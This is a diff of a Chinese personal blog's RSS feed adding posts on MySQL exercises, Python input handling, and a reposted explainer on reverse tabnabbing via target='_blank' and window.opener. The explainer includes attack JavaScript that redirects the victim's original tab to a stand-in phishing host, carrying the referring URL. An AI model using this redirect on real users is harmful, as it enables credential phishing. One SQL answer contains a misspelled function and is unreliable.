@@ -1,24 +1,257 @@
 <?xml version="1.0"?>
 <rss version="2.0">
     <channel>
-        <title>StarofEden🍀</title>
+        <title>StarofEden🌸</title>
         <link>https://StarofEden.github.io</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Sat, 04 Nov 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Sat, 04 Nov 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Fri, 10 Nov 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Fri, 10 Nov 2023 00:00:00 +0800</lastBuildDate>
+        <category>mysql</category>
         <category>JavaScript</category>
         <category>nodejs</category>
         <category>xctf</category>
-        <category>kali</category>
-        <category>web漏洞</category>
-        <category>xss</category>
+        <category>网络安全</category>
+        <category>html</category>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/11/10/mysql%E5%A4%8D%E4%B9%A0/</guid>
+            <title>mysql语句总结</title>
+            <link>https://starofeden.github.io/2023/11/10/mysql%E5%A4%8D%E4%B9%A0/</link>
+            <category>mysql</category>
+            <pubDate>Fri, 10 Nov 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;课堂复习题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#课堂复习题&#34;&gt;#&lt;/a&gt; 课堂复习题&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;已知三张表如下:&lt;br&gt;
+ 学生 (学号、姓名、班级、年龄)&lt;br&gt;
+ 课程 (课号、课名、学分)&lt;br&gt;
+ 选课 (学号、课号、成绩)&lt;br&gt;
+ 请完成以下练习题:&lt;br&gt;
+1、把数据库原理及应用课程成绩增加 10 分。&lt;br&gt;
+2、删除李四同学的选课记录。&lt;br&gt;
+3、 显示数据库原理及应用的学生成绩&lt;br&gt;
+ 4、查询每个学生选修课程的学号、课程名称和成绩。&lt;br&gt;
+5、查询每个同学的学号，姓名，总学分。(成绩及格的才能拿到学分)&lt;br&gt;
+ 6、找出每个学生超过他所有的选修课程的平均成绩的课程号。&lt;br&gt;
+7、查询每个班、每门课程的平均分&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;1. 把数据库原理及应用课程成绩增加 10 分。&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;UPDATE&lt;/span&gt; 选课  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SET&lt;/span&gt; 成绩 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; 成绩 &lt;span class=&#34;operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; 课号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; 课号 &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; 课程 &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; 课名 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;数据库原理及应用&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2. 删除李四同学的选课记录&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;DELETE&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; 选课  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; 学号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; 学号 &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; 学生 &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; 姓名 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;李四&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3. 显示数据库原理及应用的学生成绩&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; 学生.学号, 学生.姓名, 选课.成绩   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; 学生   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;JOIN&lt;/span&gt; 选课 &lt;span class=&#34;keyword&#34;&gt;ON&lt;/span&gt; 学生.学号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; 选课.学号   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;JOIN&lt;/span&gt; 课程 &lt;span class=&#34;keyword&#34;&gt;ON&lt;/span&gt; 选课.课号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; 课程.课号   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; 课程.课名 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;数据库原理及应用&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;4. 查询每个学生选修课程的学号、课程名称和成绩。&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; 学生.学号, 课程.课名, 选课.成绩&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; 学生   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;JOIN&lt;/span&gt; 选课 &lt;span class=&#34;keyword&#34;&gt;ON&lt;/span&gt; 学生.学号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; 选课.学号   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;JOIN&lt;/span&gt; 课程 &lt;span class=&#34;keyword&#34;&gt;ON&lt;/span&gt; 选课.课号 &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; 课程.课号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;多表查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#多表查询&#34;&gt;#&lt;/a&gt; 多表查询&lt;/h1&gt;
+&lt;p&gt;1. 查询每个同学的总学分，成绩大于等于 60 才能拿到学分，以中文显示学号、姓名、总学分，以学号升序排列。&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; s.sno &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; 学号, s.sn &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; 姓名, coalesec(&lt;span class=&#34;built_in&#34;&gt;sum&lt;/span&gt;(credit)) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; 总学分&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;join&lt;/span&gt; sc &lt;span class=&#34;keyword&#34;&gt;on&lt;/span&gt; s.sno &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; sc.sno&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;join&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;on&lt;/span&gt; sc.cno &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; c.cno &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; sc.score&lt;span class=&#34;operator&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; 学号,姓名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; 总学分;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/11/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</guid>
+            <title>危险的 target=&#34;_blank&#34; 与 “opener”</title>
+            <link>https://starofeden.github.io/2023/11/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</link>
+            <category>网络安全</category>
+            <category>html</category>
+            <pubDate>Thu, 09 Nov 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;blockquote&gt;
+&lt;p&gt;作者：jinliming2@知道创宇 404 实验室&lt;br&gt;
+原文：&lt;a href=&#34;http://mp.weixin.qq.com/s/T4jQUdS-rar7hr2EWilJrw&#34;&gt;http://mp.weixin.qq.com/s/T4jQUdS-rar7hr2EWilJrw&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h1&gt;
+&lt;h2 id=&#34;parent-与-opener&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#parent-与-opener&#34;&gt;#&lt;/a&gt; parent 与 opener&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;window.parent:&lt;br&gt;
+ 我们可以通过 window.parent 从当前窗口打开父窗口。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;width=200,height=100&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  中提供了一个用于父子页面交互的对象，叫做 window.parent，我们可以通过 window.parent 对象来从框架中的页面访问父级页面的 window。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;window.opener&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;opener 与 parent 一样，只不过是用于  &lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot;&amp;gt;&lt;/code&gt;  在新标签页打开的页面的。通过 &lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot;&amp;gt;&lt;/code&gt;  打开的页面，可以直接使用 window.opener 来访问来源页面的 window 对象。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;同域与跨域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同域与跨域&#34;&gt;#&lt;/a&gt; 同域与跨域&lt;/h2&gt;
+&lt;p&gt;浏览器提供了完整的跨域保护，在域名相同时， parent 对象和 opener 对象实际上就直接是上一级的 window 对象；而当域名不同时， parent 和 opener 则是经过包装的一个 global 对象。这个 global 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt; &amp;lt;iframe&amp;gt;&lt;/code&gt;  中，提供了一个 sandbox 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 &lt;code&gt; &amp;lt;iframe&amp;gt;&lt;/code&gt;  的安全性。&lt;/p&gt;
+&lt;h2 id=&#34;locationreplace&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#locationreplace&#34;&gt;#&lt;/a&gt; location.replace&lt;/h2&gt;
+&lt;p&gt;replace () 方法可用一个新文档取代当前文档。&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;https://www.runoob.com&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;http-referer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http-referer&#34;&gt;#&lt;/a&gt; HTTP Referer&lt;/h2&gt;
+&lt;p&gt;可以通过 http 的 referer 字段判断你是从那个网站过来的（替换原来网站的前置条件）&lt;/p&gt;
+&lt;h1 id=&#34;利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h1&gt;
+&lt;h2 id=&#34;详细步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#详细步骤&#34;&gt;#&lt;/a&gt; 详细步骤&lt;/h2&gt;
+&lt;p&gt;1. 在你的网站  &lt;code&gt;https://example.com&lt;/code&gt;  上存在一个链接：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;https://an.evil.site&amp;quot;target=&amp;quot;_blank&amp;quot;&amp;gt;进入一个“邪恶”`的网站&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2. 用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过  &lt;code&gt;HTTP Header&lt;/code&gt;  中的  &lt;code&gt;Referer&lt;/code&gt;  属性来判断用户的来源。&lt;/p&gt;
+&lt;p&gt;并且，这个网站上包含着类似于这样的 JavaScript 代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; url=&lt;span class=&#34;built_in&#34;&gt;encodeURIComponent&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;#123;header.referer&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;opener&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;https://a.fake.site/?&amp;#x27;&lt;/span&gt;+url);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3. 此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 &lt;code&gt; https://a.fake.site/?https%3A%2F%2Fexample.com%2F。&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;4. 恶意网站 &lt;code&gt;https://a.fake.site&lt;/code&gt;  根据  &lt;code&gt;Query String &lt;/code&gt; 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。&lt;/p&gt;
+&lt;p&gt;5. 用户关闭 &lt;code&gt; https://an.evil.site&lt;/code&gt;  的标签页，回到原来的网站……………… 已经回不去了。&lt;/p&gt;
+&lt;p&gt;上面的攻击步骤是在跨域的情况下的，在 &lt;code&gt;跨域情况&lt;/code&gt; 下， opener 对象和 parent 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。&lt;/p&gt;
+&lt;p&gt;但是与 parent 不同的是， &lt;code&gt;在跨域的情况下， opener 仍然可以调用 location.replace 方法&lt;/code&gt; 而 parent 则不可以。&lt;/p&gt;
+&lt;p&gt;如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/11/06/python/</guid>
+            <title>Python做题笔记</title>
+            <link>https://starofeden.github.io/2023/11/06/python/</link>
+            <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#函数&#34;&gt;#&lt;/a&gt; 函数&lt;/h1&gt;
+&lt;h2 id=&#34;输入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#输入&#34;&gt;#&lt;/a&gt; 输入&lt;/h2&gt;
+&lt;h3 id=&#34;input&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#input&#34;&gt;#&lt;/a&gt; input()&lt;/h3&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;input:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;可以输入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;:runoob  &lt;span class=&#34;comment&#34;&gt;#a都是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;输入一个数字&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;处理输入的一长串数字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#处理输入的一长串数字&#34;&gt;#&lt;/a&gt; 处理输入的一长串数字&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p red&#39;&gt;map()&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;().split())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p red&#39;&gt;list()&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;().split()))  &lt;span class=&#34;comment&#34;&gt;# 输入n个分数并存入列表 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p red&#39;&gt;sort()&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;对列表进行升序排序&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;.sort()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;去掉最高分和最低分 (左闭右开)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;打印&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打印&#34;&gt;#&lt;/a&gt; 打印&lt;/h2&gt;
